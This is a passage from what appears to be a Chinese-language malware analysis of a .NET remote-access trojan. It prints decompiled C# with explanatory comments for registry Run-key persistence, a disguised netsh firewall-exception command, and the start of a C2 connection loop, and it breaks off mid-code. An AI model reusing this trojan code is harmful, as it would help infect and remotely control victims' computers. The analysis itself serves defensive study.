<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c#"><code><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">// 持久化：写入注册表自启动项（OK.Isu为true时执行）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Isu</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 写入HKCU（当前用户注册表）：无需管理员权限，成功率高</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Registry</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">CurrentUser</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">OpenSubKey</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">sf</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#80A665;--1:#59873A">SetValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FullName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D;--1:#B56959"> ..</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 尝试写入HKLM（本地机器注册表）：需要管理员权限，失败则静默</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Registry</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LocalMachine</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">OpenSubKey</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">sf</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#80A665;--1:#59873A">SetValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FullName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D;--1:#B56959"> ..</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="// 持久化：写入注册表自启动项（OK.Isu为true时执行）    if (OK.Isu)    {        try        {  // 写入HKCU（当前用户注册表）：无需管理员权限，成功率高            OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, &#x22;\&#x22;&#x22; + OK.LO.FullName + &#x22;\&#x22; ..&#x22;);        }        try        {  // 尝试写入HKLM（本地机器注册表）：需要管理员权限，失败则静默            OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, &#x22;\&#x22;&#x22; + OK.LO.FullName + &#x22;\&#x22; ..&#x22;);        }    }"><div></div></button></div></figure></div>
</li>
<li>
<p><strong>防火墙穿透</strong>: 修改系统设置或添加防火墙白名单，确保 C2 流量不被拦截。</p>
</li>
</ul>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c#"><code><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">// 自保护：添加防火墙白名单（避免恶意程序被防火墙拦截）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// 核心逻辑：执行cmd命令「netsh advfirewall firewall add allowedprogram "程序路径" "程序名" ENABLE」</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// 关键混淆："Exceptiona"是"netsh"的拼写篡改（规避安全软件对「netsh」的特征检测）</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#BD976A;--1:#B07D48">Interaction</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Shell</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Concat</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#666666;--1:#999999">[]</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">Exceptiona firewall add allowedprogram </span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FullName</span><span style="--0:#666666;--1:#999999">,</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D;--1:#B56959"> </span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Name</span><span style="--0:#666666;--1:#999999">,</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D;--1:#B56959"> ENABLE</span><span style="--0:#C98A7D77;--1:#B5695977">"</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}),</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">5000</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="// 自保护：添加防火墙白名单（避免恶意程序被防火墙拦截）    try    {        // 核心逻辑：执行cmd命令「netsh advfirewall firewall add allowedprogram &#x22;程序路径&#x22; &#x22;程序名&#x22; ENABLE」        // 关键混淆：&#x22;Exceptiona&#x22;是&#x22;netsh&#x22;的拼写篡改（规避安全软件对「netsh」的特征检测）        Interaction.Shell(string.Concat(new string[]        {            &#x22;Exceptiona firewall add allowedprogram \&#x22;&#x22;,            OK.LO.FullName,            &#x22;\&#x22; \&#x22;&#x22;,            OK.LO.Name,            &#x22;\&#x22; ENABLE&#x22;        }), 0, true, 5000);    }"><div></div></button></div></figure></div>
<h3 id="2-远程控制核心rc-与-ind">2. 远程控制核心：RC() 与 Ind()<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 2. 远程控制核心：RC() 与 Ind()" data-pagefind-ignore="" href="#2-远程控制核心rc-与-ind">#</a></h3>
<p>这是木马的“耳朵”和“嘴巴”。</p>
<ul>
<li><strong><code>RC()</code> (Remote Control)</strong>: 维护与 C2 服务器的 TCP 连接。如果断开，它会尝试自动重连。</li>
</ul>
<div class="expressive-code"><figure class="frame" style="--lnWidth:3ch"><figcaption class="header"></figcaption><pre data-language="c#"><code><div class="ec-line"><div class="code"><span style="--0:#CB7676;--1:#AB5959">public</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">static</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">void</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">RC</span><span style="--0:#666666;--1:#999999">()</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">checked</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 启用溢出检查（恶意代码常用，避免因数据溢出崩溃）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#758575DD;--1:#A0ADA0">// 核心无限循环：永不退出，确保持续与C2服务器通信</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">for</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(;;)</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">lastcap</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 清空捕获的临时数据（混淆变量，无实际语义）</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 检查是否已建立C2连接（OK.C是C2客户端对象，如Socket/TcpClient）</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">C</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">!=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">long</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">dataLength</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#4C9A91;--1:#2F798A">1L</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 存储待接收数据的总长度</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">loopCount</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">      </span><span style="--0:#758575DD;--1:#A0ADA0">// 循环计数，用于延迟规避检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">for</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(;;)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#80A665;--1:#59873A">IL_1B</span><span style="--0:#666666;--1:#999999">:</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 跳转标签：简化循环逻辑，恶意代码常用混淆手段</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">loopCount</span><span style="--0:#CB7676;--1:#AB5959">++</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#758575DD;--1:#A0ADA0">// 每循环10次延迟1ms：规避安全软件对“高频循环”的行为检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">loopCount</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">10</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#BD976A;--1:#B07D48">loopCount</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#BD976A;--1:#B07D48">Thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Sleep</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#758575DD;--1:#A0ADA0">// 检查连接状态标记（OK.Cn=false表示连接断开），断开则退出内层循环</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Cn</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#4D9375;--1:#1E754F">break</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#758575DD;--1:#A0ADA0">// 检查C2连接的网络流是否有可读取数据</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">C</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Available</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">&#x3C;</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#758575DD;--1:#A0ADA0">// 无数据时阻塞等待（Poll(-1,0)表示无限等待数据）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">C</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Client</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Poll</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#758575DD;--1:#A0ADA0">// 有数据时，循环读取并解析</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">while</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">C</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Available</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">!=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#758575DD;--1:#A0ADA0">// 第一步：未解析出数据长度时（dataLength=-1），先读取长度</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">dataLength</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#4C9A91;--1:#2F798A">1L</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#4D9375;--1:#1E754F">string</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">lengthStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#4D9375;--1:#1E754F">for</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(;;)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 逐字节读取，直到读到0（自定义协议：长度字符串以0结尾）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">byteData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">C</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetStream</span><span style="--0:#666666;--1:#999999">().</span><span style="--0:#80A665;--1:#59873A">ReadByte</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">byteData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 流结束（连接断开）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                        </span><span style="--0:#4D9375;--1:#1E754F">goto</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">Block_9</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 跳转到异常处理逻辑</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">byteData</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 长度字符串结束符</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                        </span><span style="--0:#4D9375;--1:#1E754F">break</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 拼接长度字符串（混淆转换：ChrW转字符再转整数再转字符串，增加逆向难度）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#BD976A;--1:#B07D48">lengthStr</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Conversions</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToString</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Conversions</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToInteger</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Strings</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ChrW</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">byteData</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#80A665;--1:#59873A">ToString</span><span style="--0:#666666;--1:#999999">()));</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
